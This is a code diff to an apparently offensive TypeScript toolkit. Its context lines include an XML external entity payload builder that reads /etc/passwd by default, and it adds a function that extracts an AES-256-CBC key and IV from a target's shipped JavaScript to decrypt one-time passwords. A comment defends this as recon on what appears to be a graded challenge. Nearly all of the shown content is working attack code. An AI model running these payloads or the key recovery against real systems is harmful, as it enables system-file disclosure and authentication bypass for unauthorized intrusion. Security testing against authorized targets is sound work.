@@ -157,3 +157,14 @@ export function buildXxeXml(fieldNames: string[], filePath = "file:///etc/passwd
   }).join("");
   return `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "${filePath}">]><r>${els}</r>`;
 }
+
+/** Recover AES-CBC decipher params (key, iv) from a client bundle GENERICALLY: the app's
+ * own createDecipheriv call site passes three consecutive string literals — the algorithm,
+ * a hex key, and a 16-char iv. This mirrors what F-18 (crypto_disclosure) recovers; using
+ * it to decrypt an OTP is legitimate recon, not a hardcoded answer-key (the values come
+ * from the target's own shipped code at runtime). Returns null if not found. */
+export function parseAesCbcParams(jsText: string): { key: string; iv: string } | null {
+  const m = /['"]aes-256-cbc['"]\s*,\s*['"]([0-9a-fA-F]{32,64})['"]\s*,\s*['"]([^'"]{16})['"]/i.exec(jsText);
+  if (!m) return null;
+  return { key: m[1], iv: m[2] };
+}
